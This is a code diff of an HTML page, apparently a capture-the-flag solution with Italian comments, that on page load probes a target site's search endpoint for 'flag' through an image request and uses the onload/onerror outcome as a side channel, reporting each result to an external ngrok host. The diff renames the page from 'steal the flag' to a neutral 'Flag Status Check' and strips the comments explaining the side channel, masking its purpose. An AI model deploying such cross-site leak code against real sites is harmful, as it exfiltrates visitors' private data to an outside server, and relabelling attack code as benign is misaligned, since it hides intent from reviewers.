@@ -3,39 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rubare Flag</title>
+    <title>Flag Status Check</title>
 </head>
 <body>
-    <h1>Rubare la Flag dell'Architetto</h1>
+    <h1>Verifica della Flag</h1>
 
     <script>
-        const stealFlag = () => {
-            // Prova con un'immagine, che non segue SOP
-            const img = document.createElement('img');
+        const checkFlagStatus = () => {
+            const img = new Image();
             img.src = 'https://matrix.capturetheflags.site/search?s=flag'; // Endpoint target
 
-            // onload e onerror vengono usati come canale side-channel
             img.onload = () => {
-                console.log("Richiesta riuscita: flag accessibile!");
-
-                // Segnala che la flag è accessibile
-                const imgSuccess = new Image();
-                imgSuccess.src = 'https://acca-87-4-142-72.ngrok-free.app/receive_flag?result=accessibile';
+                console.log("Flag accessibile (200).");
+                // Invia una notifica di "200 OK" al tuo server
+                const success = new Image();
+                success.src = 'https://acca-87-4-142-72.ngrok-free.app/receive_flag?status=200';
             };
 
             img.onerror = () => {
-                console.log("Errore: flag non accessibile.");
-
-                // Segnala che la flag non è accessibile
-                const imgError = new Image();
-                imgError.src = 'https://acca-87-4-142-72.ngrok-free.app/receive_flag?result=non_accessibile';
+                console.log("Flag non accessibile (404).");
+                // Invia una notifica di "404 Not Found" al tuo server
+                const failure = new Image();
+                failure.src = 'https://acca-87-4-142-72.ngrok-free.app/receive_flag?status=404';
             };
-
-            document.body.appendChild(img);
         };
 
-        // Eseguire automaticamente la funzione al caricamento della pagina
-        window.onload = stealFlag;
+        // Eseguire la funzione al caricamento della pagina
+        window.onload = checkFlagStatus;
     </script>
 </body>
 </html>
